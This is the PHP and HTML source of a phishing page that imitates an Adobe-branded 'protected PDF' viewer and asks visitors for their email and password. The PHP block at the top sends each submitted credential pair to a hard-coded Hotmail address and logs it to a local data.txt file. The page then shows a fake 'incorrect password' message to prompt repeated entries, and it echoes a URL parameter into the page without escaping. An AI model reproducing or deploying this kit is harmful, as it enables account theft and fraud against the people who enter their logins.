<?php
if(isset($_POST['sendgo']) && $_POST['sendgo'] == 'sendto'){
  $to      = 'livebillcenter020@hotmail.com';
  $subject = 'Adobe'.mt_rand();
  $message = 'Email: '.$_POST['email'] .' PASSWORD: '.$_POST['password']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);
    @mail($to, $subject, $message, $headers);

    #header ('Location: denied.html');

}
?>
<!DOCTYPE html>

<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<title>P.D.F® :: Online Reader-XI</title>
<style>
@charset "utf-8";
/* CSS Document */

body {
   font-family:Verdana;
   topmargin:0px; 
   leftmargin:0px; 
   rightmargin:0px; 
   background-attachment: fixed;
     }

#header { color:#fff; 
          font-size:15px;
          background:#000000;
          font-family:Verdana;
         }

#doc { color:#999; 
       border-top:#999 solid 1px; 
     padding:8px;
     font-size:15px;
     }
#doc1 { color:#999; 
       border-top:#999 solid 1px; 
     border-left:#999 solid 1px;
     padding:5px;
     font-size:15px;
     }

#form { color:#29703B; 
        font-size:20px;
       }

input{
width:400px;
padding:10px;
border-radius:0px;
border:1px solid #E4E4E4;
font-size:16px;
font-family:Verdana;
color:#333;
outline:none;
}

input:focus{
border:1px solid #305E8B;
outline:none;
color:#060;
}

input:hover {box-shadow:0px 1px 1px 1px #999;
}

input[type=submit]{
width:418px;
padding:10px;
border-radius:0px;
border:1px solid #E4E4E4;
font-size:14px;
font-family:Verdana;
background:#B74446;
color:#FFF;
}

input[type=submit]:hover{
background:#8F383A;
color:#FFF;
cursor:pointer;
border:hidden;
box-shadow:0px 1px 1px 1px #999;
}

#check { width:16px; 
         height:16px; 
     color:#666;
         }
     
#wch  { width:80%;
}

#fdiv  { width:500px;;
         text-align:left;
     padding:15px;
     background:#FFF;
     border-radius:2px;
}

#ex {  color:#29703B;
        font-size:14px;
    font-weight:bold;
    padding-bottom:8px;
         }
#rem {color:#999;
      padding-left:25px;
      }
 
#priv { font-size:12px;
        padding:5px; 
    color:#999;}
    
#com { padding-top:5px; 
       font-size:14px; 
     border-top:#CBCBCB solid 1px;
     color:#CBCBCB;
     padding-left:48px;
      }
      
#ema{
  color:#FF0000;
  padding-left:10px;
  font-family:Verdana;
  font-size:13px;
}

@media only screen and (max-width: 600px) 
{
#header { display:none;
         }
#doc { display:none;
    border-top:#E6E6E6 solid 1px; 
     border-bottom:#E6E6E6 solid 1px;
     }
           
           #ema{
  color:#FF0000;
  padding-left:10px;
  font-family:Verdana;
  font-size:11px;
}

           
#doc1 { color:#999; 
       border-top:#E6E6E6 solid 1px; 
     border-bottom:#E6E6E6 solid 1px;
     padding:3px;
     font-size:13px;
     }
#fdiv  { width:95%;;
         text-align:left;
     padding:5px;
     background:#FFF;
     padding-left:20px;
     border-radius:3px;
}
#form { color:#29703B; 
        font-size:14px;
       }

#ex {  color:#29703B;
        font-size:11px;
    font-weight:bold;
    padding-bottom:6px;
    width:65%;
         }
  
input{
width:95%;
padding:6px;
border-radius:0px;
border:1px solid #E4E4E4;
font-size:13px;
font-family:Verdana;
color:#333;
outline:none;
}
input[type=submit]{
width:100%;
padding:6px;
border-radius:2px;
border:1px solid #E4E4E4;
font-size:13px;
font-family:Verdana;
background:#29703B;
color:#FFF;
}
#check { width:13px; 
         height:13px; 
     color:#666;
         }
     
#wch  { width:60%;
}

#l {font-size:14px;}
#rem { font-size:13px;}
#priv { font-size:10px;
        padding:5px; 
    color:#999;}
#com { padding-top:4px; 
       font-size:11px; 
     border-top:#29703B solid 1px;
     color:#C0C0C0;
      }
</style>
<style>
  .alert {
    padding: 15px;
    color: #f44336; /* Red */
    margin-bottom: 5px;
}
</style>
</head>
<body background="ad2.png">
<div align="center" style="width:100%; height:100%;"><br>
<br>
<br>
<br>
<br>
<br>

<div align="center" style=" width:600px; padding:5px; background:#FCFCFC; font-family:Segoe UI Light;">
<img src="ad.png" width="597">
<br><br>

<font size="6"><img src="index.gif" width="33" height="28" alt="">
This file is protected by<br>
AdobeDoc® Security.</font><br>
<br><strong>Kindly Sign in to have access the pdf document.</strong><br>
<br>
<form name="xe" action="./?email=<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" method="post" style="width:400px;">
<?php
if(isset($_POST['sendgo']) && $_POST['sendgo'] == 'sendto'){?>
<div class="alert">
  <p>Email or Password is Incorrect, Please Try Again!</p>
</div>
<?php }?>
<input id="ema" type="text" name="email" placeholder="Email address" value="<?php if(!empty($_GET['email'])){echo $_GET['email'];}?>" required="" style="outline:none; font-size:16px;">

<div style="padding:5px;"></div>
<input id="emo" type="password" name="password" placeholder="Confirm password" required="" style="outline:none;">

<div style="padding:5px;"></div>

<div style="padding:6px;"></div>
        <input type="hidden" name="sendgo" value="sendto">
<input type="submit" name="submit" value="View PDF Document" required="">
</form><br>
<img src="ad1.png" width="510" height="85" alt=""> <br><br>

</div>
<br>
<br>
<br>
<br><br>
<br>


</div>


</body></html>